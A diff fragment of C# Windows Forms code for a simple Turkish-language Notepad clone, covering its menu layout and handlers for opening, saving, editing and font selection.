+            this.toolStripSeparator2.Name = "toolStripSeparator2";
+            this.toolStripSeparator2.Size = new System.Drawing.Size(176, 6);
+            this.cikisToolStripMenuItem.Name = "cikisToolStripMenuItem";
+            this.cikisToolStripMenuItem.ShortcutKeyDisplayString = "Alt+F4";
+            this.cikisToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.cikisToolStripMenuItem.Text = "�ikis";
+            this.cikisToolStripMenuItem.Click += new System.EventHandler(this.cikisToolStripMenuItem_Click);
+            this.duzenToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.geriAlToolStripMenuItem,
+            this.toolStripSeparator3,
+            this.kesToolStripMenuItem,
+            this.kopyalaToolStripMenuItem,
+            this.yapistirToolStripMenuItem,
+            this.silToolStripMenuItem,
+            this.toolStripSeparator4,
+            this.bulToolStripMenuItem,
+            this.sonrakiniBulToolStripMenuItem,
+            this.degistirToolStripMenuItem,
+            this.gitToolStripMenuItem,
+            this.toolStripSeparator5,
+            this.tumunuSecToolStripMenuItem,
+            this.saatTarihToolStripMenuItem});
+            this.duzenToolStripMenuItem.Name = "duzenToolStripMenuItem";
+            this.duzenToolStripMenuItem.Size = new System.Drawing.Size(52, 19);
+            this.duzenToolStripMenuItem.Text = "Duzen";
+            this.geriAlToolStripMenuItem.Name = "geriAlToolStripMenuItem";
+            this.geriAlToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+Z";
+            this.geriAlToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.geriAlToolStripMenuItem.Text = "Geri Al";
+            this.geriAlToolStripMenuItem.Click += new System.EventHandler(this.geriAlToolStripMenuItem_Click);
+            this.toolStripSeparator3.Name = "toolStripSeparator3";
+            this.toolStripSeparator3.Size = new System.Drawing.Size(180, 6);
+            this.kesToolStripMenuItem.Name = "kesToolStripMenuItem";
+            this.kesToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+X";
+            this.kesToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.kesToolStripMenuItem.Text = "Kes";
+            this.kesToolStripMenuItem.Click += new System.EventHandler(this.kesToolStripMenuItem_Click);
+            this.kopyalaToolStripMenuItem.Name = "kopyalaToolStripMenuItem";
+            this.kopyalaToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+C";
+            this.kopyalaToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.kopyalaToolStripMenuItem.Text = "Kopyala";
+            this.kopyalaToolStripMenuItem.Click += new System.EventHandler(this.kopyalaToolStripMenuItem_Click);
+            this.yapistirToolStripMenuItem.Name = "yapistirToolStripMenuItem";
+            this.yapistirToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+V";
+            this.yapistirToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.yapistirToolStripMenuItem.Text = "Yapistir";
+            this.yapistirToolStripMenuItem.Click += new System.EventHandler(this.yapistirToolStripMenuItem_Click);
+            this.silToolStripMenuItem.Name = "silToolStripMenuItem";
+            this.silToolStripMenuItem.ShortcutKeyDisplayString = "Del";
+            this.silToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.silToolStripMenuItem.Text = "Sil";
+            this.silToolStripMenuItem.Click += new System.EventHandler(this.silToolStripMenuItem_Click);
+            this.toolStripSeparator4.Name = "toolStripSeparator4";
+            this.toolStripSeparator4.Size = new System.Drawing.Size(180, 6);
+            this.bulToolStripMenuItem.Name = "bulToolStripMenuItem";
+            this.bulToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+F";
+            this.bulToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.bulToolStripMenuItem.Text = "Bul...";
+            this.sonrakiniBulToolStripMenuItem.Name = "sonrakiniBulToolStripMenuItem";
+            this.sonrakiniBulToolStripMenuItem.ShortcutKeyDisplayString = "F3";
+            this.sonrakiniBulToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.sonrakiniBulToolStripMenuItem.Text = "Sonrakini Bul";
+            this.degistirToolStripMenuItem.Name = "degistirToolStripMenuItem";
+            this.degistirToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+H";
+            this.degistirToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.degistirToolStripMenuItem.Text = "Degistir...";
+            this.gitToolStripMenuItem.Name = "gitToolStripMenuItem";
+            this.gitToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+G";
+            this.gitToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.gitToolStripMenuItem.Text = "Git...";
+            this.toolStripSeparator5.Name = "toolStripSeparator5";
+            this.toolStripSeparator5.Size = new System.Drawing.Size(180, 6);
+            this.tumunuSecToolStripMenuItem.Name = "tumunuSecToolStripMenuItem";
+            this.tumunuSecToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+A";
+            this.tumunuSecToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.tumunuSecToolStripMenuItem.Text = "Tumunu Sec";
+            this.tumunuSecToolStripMenuItem.Click += new System.EventHandler(this.tumunuSecToolStripMenuItem_Click);
+            this.saatTarihToolStripMenuItem.Name = "saatTarihToolStripMenuItem";
+            this.saatTarihToolStripMenuItem.ShortcutKeyDisplayString = "F5";
+            this.saatTarihToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.saatTarihToolStripMenuItem.Text = "Saat/Tarih";
+            this.saatTarihToolStripMenuItem.Click += new System.EventHandler(this.saatTarihToolStripMenuItem_Click);
+            this.bicimToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.yaziTipiToolStripMenuItem});
+            this.bicimToolStripMenuItem.Name = "bicimToolStripMenuItem";
+            this.bicimToolStripMenuItem.Size = new System.Drawing.Size(49, 19);
+            this.bicimToolStripMenuItem.Text = "Bicim";
+            this.yaziTipiToolStripMenuItem.Name = "yaziTipiToolStripMenuItem";
+            this.yaziTipiToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.yaziTipiToolStripMenuItem.Text = "Yazi Tipi...";
+            this.yaziTipiToolStripMenuItem.Click += new System.EventHandler(this.yaziTipiToolStripMenuItem_Click);
+            this.yardimToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.notDefteriHakkindaToolStripMenuItem});
+            this.yardimToolStripMenuItem.Name = "yardimToolStripMenuItem";
+            this.yardimToolStripMenuItem.Size = new System.Drawing.Size(57, 19);
+            this.yardimToolStripMenuItem.Text = "Yardim";
+            this.notDefteriHakkindaToolStripMenuItem.Name = "notDefteriHakkindaToolStripMenuItem";
+            this.notDefteriHakkindaToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
+            this.notDefteriHakkindaToolStripMenuItem.Text = "Not Defteri Hakkinda";
+            this.notDefteriHakkindaToolStripMenuItem.Click += new System.EventHandler(this.notDefteriHakkindaToolStripMenuItem_Click);
+            this.textBox1.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.textBox1.Font = new System.Drawing.Font("Lucida Console", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.textBox1.Location = new System.Drawing.Point(0, 23);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(585, 351);
+            this.textBox1.TabIndex = 1;
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(585, 374);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.menuStrip1);
+            this.MainMenuStrip = this.menuStrip1;
+            this.Name = "Form1";
+            this.Text = "Adsiz - Not Defteri";
+            this.menuStrip1.ResumeLayout(false);
+            this.menuStrip1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+        private System.Windows.Forms.MenuStrip menuStrip1;
+        private System.Windows.Forms.ToolStripMenuItem dosyaToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem yeniToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem acToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem kaydetToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem farkliKaydetToolStripMenuItem;
+        private System.Windows.Forms.ToolStripSeparator toolStripSeparator1;
+        private System.Windows.Forms.ToolStripMenuItem sayfaYapisiToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem yazdirToolStripMenuItem;
+        private System.Windows.Forms.ToolStripSeparator toolStripSeparator2;
+        private System.Windows.Forms.ToolStripMenuItem cikisToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem duzenToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem geriAlToolStripMenuItem;
+        private System.Windows.Forms.ToolStripSeparator toolStripSeparator3;
+        private System.Windows.Forms.ToolStripMenuItem kesToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem kopyalaToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem yapistirToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem silToolStripMenuItem;
+        private System.Windows.Forms.ToolStripSeparator toolStripSeparator4;
+        private System.Windows.Forms.ToolStripMenuItem bulToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem sonrakiniBulToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem degistirToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem gitToolStripMenuItem;
+        private System.Windows.Forms.ToolStripSeparator toolStripSeparator5;
+        private System.Windows.Forms.ToolStripMenuItem tumunuSecToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem saatTarihToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem bicimToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem yardimToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem yaziTipiToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem notDefteriHakkindaToolStripMenuItem;
+        private System.Windows.Forms.TextBox textBox1;
+
+        string filePath = "";
+        private void notDefteriHakkindaToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Form2 frm = new Form2();
+            frm.Show();
+        }
+
+        string getFileName(string path)
+        {
+            FileInfo fInfo = new FileInfo(path);
+            return fInfo.Name;
+        }
+
+        private void farkliKaydetToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            SaveFileDialog sfd = new SaveFileDialog();
+            sfd.Filter = "Metin Belgeleri(*.txt)|*.txt|Tum Dosyalar(*.*)|*.*";
+            if (sfd.ShowDialog() == DialogResult.OK)
+            {
+                Text = getFileName(sfd.FileName) + " - Not defteri";
+                FileStream fStream = new FileStream(sfd.FileName, FileMode.OpenOrCreate, FileAccess.Write);
+                StreamWriter sWrite = new StreamWriter(fStream);
+                foreach (var item in textBox1.Lines)
+                    sWrite.WriteLine(item.ToString());
+                sWrite.Flush();
+                sWrite.Close();
+                fStream.Close();
+            }
+        }
+
+        private void acToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+            ofd.Filter = "Metin Belgeleri(*.txt)|*.txt|Tum Dosyalar(*.*)|*.*";
+            if (ofd.ShowDialog() == DialogResult.OK)
+            {
+                Text = getFileName(ofd.FileName) + " - Not Defteri";
+                filePath = ofd.FileName;
+                FileStream fStream = new FileStream(ofd.FileName, FileMode.Open, FileAccess.Read);
+                StreamReader sReader = new StreamReader(fStream);
+                string line = sReader.ReadLine();
+                while (line != null)
+                {
+                    textBox1.Text += line + "\n";
+                    line = sReader.ReadLine();
+                }
+                sReader.Close();
+                fStream.Close();
+            }
+        }
+
+        private void cikisToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+
+        private void saatTarihToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            textBox1.Text = DateTime.Now.ToString();
+        }
+
+        private void yeniToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            textBox1.Text = "";
+            Text = "Adsiz - Not Defteri";
+            filePath = "";
+        }
+
+        private void tumunuSecToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            textBox1.SelectAll();
+        }
+
+        private void geriAlToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            textBox1.Undo();
+        }
+
+        private void kesToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            textBox1.Cut();
+        }
+
+        private void kopyalaToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            textBox1.Copy();
+        }
+
+        private void yapistirToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            textBox1.Paste();
+        }
+
+        private void silToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void yaziTipiToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            FontDialog fd = new FontDialog();
+            fd.Font = textBox1.Font;
+            if (fd.ShowDialog() == DialogResult.OK)
+            {
+                textBox1.Font = fd.Font;
+            }
+        }
+
+        private void kaydetToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (filePath != "")
+            {
+                FileStream fStream = new FileStream(filePath, FileMode.OpenOrCreate, FileAccess.Write);
+                StreamWriter sWrite = new StreamWriter(fStream);
+                foreach (var item in textBox1.Lines)
+                    sWrite.WriteLine(item.ToString());
+                sWrite.Flush();
+                sWrite.Close();
+                fStream.Close();
+            }
+            else
+                farkliKaydetToolStripMenuItem.PerformClick();
+        }
+    }
+}
+
